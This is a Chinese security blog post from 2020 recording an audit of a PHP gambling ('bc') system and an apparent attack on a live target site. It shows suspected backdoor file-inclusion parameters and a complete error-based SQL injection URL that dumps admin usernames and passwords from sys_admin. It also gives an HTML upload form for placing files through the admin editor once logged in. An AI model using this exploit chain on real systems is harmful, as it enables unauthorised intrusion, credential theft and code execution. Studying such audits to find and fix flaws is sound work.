<!doctype html><html lang=zh-cn><meta charset=utf-8><meta name=generator content="Hugo 0.64.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><meta name=keywords content="代码审计,RCE,PHP"><meta name=description content="朋友发给我一个bc系统让我审计，记录下过程。"><title>审计某bc系统实现代码执行&nbsp;&ndash;&nbsp;WTFSec</title><link rel=stylesheet href=/css/core.min.58bc4672a8045a0810ba4ad30a08c6d5589db1109ca0aa2e07c5e5438201ea8d11642ffa31d8ee7665d6a1b66ab9a3c5.css integrity=sha384-WLxGcqgEWggQukrTCgjG1VidsRCcoKouB8XlQ4IB6o0RZC/6MdjudmXWobZquaPF><meta name=twitter:card content="summary"><meta name=twitter:title content="审计某bc系统实现代码执行"><body><section id=header><div class="header wrap"><span class="header left-side"><a class="site home" href=/><span class="site name">WTFSec</span></a></span>
<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>分类</a><a class="nav item" href=/tags/>标签</a><a class="nav item" href=/link/>友链</a>
<input placeholder="Google 站内搜索" id=search_input style=width:150px>
<button onclick=search()><svg width="13" height="13" viewBox="0 0 13 13"><path d="m4.8495 7.8226c.82666.0 1.5262-.29146 2.0985-.87438.57232-.58292.86378-1.2877.87438-2.1144.010599-.82666-.28086-1.5262-.87438-2.0985-.59352-.57232-1.293-.86378-2.0985-.87438-.8055-.010599-1.5103.28086-2.1144.87438-.60414.59352-.8956 1.293-.87438 2.0985.021197.8055.31266 1.5103.87438 2.1144.56172.60414 1.2665.8956 2.1144.87438zm4.4695.2115 3.681 3.6819-1.259 1.284-3.6817-3.7.0019784-.69479-.090043-.098846c-.87973.76087-1.92 1.1413-3.1207 1.1413-1.3553.0-2.5025-.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239.4696-2.4966 1.4088-3.4239c.9392-.92727 2.0864-1.3969 3.4417-1.4088 1.3553-.011889 2.4906.45771 3.406 1.4088.9154.95107 1.379 2.0924 1.3909 3.4239.0 1.2126-.38043 2.2588-1.1413 3.1385l.098834.090049z"/></svg></button></nav></div><script>function search(){const search_value=document.getElementById("search_input").value;if(search_value!==''){window.open("/search/?q="+search_value,"_blank");}}
document.getElementById("search_input").addEventListener("keydown",function(e){if(e.key==="Enter"){search()}});</script></span></div></section><section id=content><div class=article-container><section class="article header"><h1 class="article title">审计某bc系统实现代码执行</h1><p class="article date"><span class=lang><a>Hzllaga</a> </span>Wednesday, August 19, 2020</p></section><article class="article markdown-body"><h1 id=审计某bc系统实现代码执行>审计某bc系统实现代码执行</h1><blockquote><p>朋友发给我一个bc系统让我审计，记录下过程。</p></blockquote><h2 id=文件包含>文件包含</h2><p>360safe/360webscan.php</p><p><img src=https://cdn.wtfsec.org/img/20200820105252.png alt></p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>if(isset($_GET[&#39;debug&#39;]) <span class=err>&amp;</span><span class=err>&amp;</span> $_GET[&#39;debug&#39;]){
    $debug = $_GET[&#39;debug&#39;];
    include_once($debug);
}</code></pre></div><p>这处感觉比较像后门，也有可能是开发者忘记删除的，利用比较简单: <code>?debug=file</code>。</p><p>m/lotto/index.php</p><p><img src=https://cdn.wtfsec.org/img/20200820110734.png alt></p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>if(isset($_GET[&#39;xp&#39;]) <span class=err>&amp;</span><span class=err>&amp;</span> $_GET[&#39;xp&#39;]){
    $xp = $_GET[&#39;xp&#39;];
    include_once($xp);
}</code></pre></div><p>这个也感觉是后门，利用方式和上面一样。</p><h2 id=sql注入>SQL注入</h2><p>show/bk_danshi_data.php</p><p><img src=https://cdn.wtfsec.org/img/20200820110957.png alt></p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>if($wap == &#39;wap&#39; and !empty($_GET[&#39;leaguename&#39;])){ //手机端选择
	$sqlwhere .= &#39; and Match_Name = \&#39;&#39;.$_GET[&#39;leaguename&#39;].&#39;\&#39;&#39;;
}</code></pre></div><p>此处<code>$sqlwhere</code>直接把<code>$_GET['leaguename']</code>直接拼接到字符串里面，未经过任何过滤</p><p><img src=https://cdn.wtfsec.org/img/20200820111615.png alt></p><p>后面判断<code>$_GET['ids']</code>为空的话，就把<code>$sqlwhere</code>拼接到<code>$sql</code>里面带入<code>query</code>查询，跟进后发现<code>$mydata1_db</code>就是一个PDO查询，没有使用参数化查询，导致了SQL注入。</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>$mydata1_db = new PDO(&#39;mysql:host=127.0.0.1;dbname=mydata1_db;charset=utf8&#39;, $db_user_utf8, $db_pwd_utf8, $driver_options);</code></pre></div><h2 id=文件上传>文件上传</h2><p>ad888\wangEditor\upload.php</p><p><img src=https://cdn.wtfsec.org/img/20200820111758.png alt></p><p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>@session_start();
if (!isset($_SESSION[&#39;adminid&#39;])) {
		logout_msg(&#39;您的登录已过期，请重新登录！&#39;);
}</code></pre></div>由于<code>$_SESSION['adminid']</code>不可控，所以此处只能透过上面的SQL注入来获取账号密码登陆后台上传</p><hr><p>跟进后台登陆代码，可以发现登陆的SQL查询，方便我们构造payload。</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>$stmt = $mydata1_db-&gt;prepare(&#39;select uid,quanxian,ip,about,address,login_pwd,login_name from mydata3_db.sys_admin where login_name=:login_name and login_pwd=:login_pwd limit 1&#39;);</code></pre></div><p>刚好目标站是开启php错误的，可以直接进行报错注入，省略许多盲注时间，Payload：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/show/bk_danshi_data.php?wap=wap<span class=err>&amp;</span>leaguename=%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x23,login_name,0x3a,login_pwd,0x23)%20FROM%20mydata3_db.sys_admin%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+</code></pre></div><p><img src=https://cdn.wtfsec.org/img/20200820112335.png alt></p><p>登陆后台后构造一个上传的表单</p><div class=highlight><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;http://website/ad888/wangEditor/upload.php&#34;</span>  <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>enctype </span><span class=o>=</span><span class=s>&#34;multipart/form-data&#34;</span><span class=p></span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;file&#34;</span><span class=p></span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;提交&#34;</span><span class=p></span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=p>/</span><span class=nt>form</span><span class=p>&gt;</span></code></pre></div><p><img src=https://cdn.wtfsec.org/img/20200820112241.png alt></p><p><img src=https://cdn.wtfsec.org/img/20200820112129.png alt></p></article><section class="article labels"><a class=category href=/categories/%E5%8E%9F%E5%88%9B/>原创</a><a class=tag href=/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/>代码审计</a><a class=tag href=/tags/rce/>RCE</a><a class=tag href=/tags/php/>PHP</a></section></div><div class="article bottom"><section class="article navigation"><p><a class=link href=/posts/shellcodeloader/><span class=li>&larr;</span>ShellcodeLoader</a></p></section></div></section><section id=footer><div class=footer-wrap><p class=copyright>©2014-2020 WTFSec.</p><p class=powerby><span>Powered by </span><a href=https://gohugo.io target=_blank>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p><p class=powerby><span>CDN by </span><a href=https://cf.wtfsec.org target=_blank>Cloudflare</a><span> and </span><a href="https://console.upyun.com/register/?invite=H1xhvqTVV" target=_blank>又拍云</a></p></div></section><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-83215806-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script data-ad-client=ca-pub-4220670081232153 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></body></html>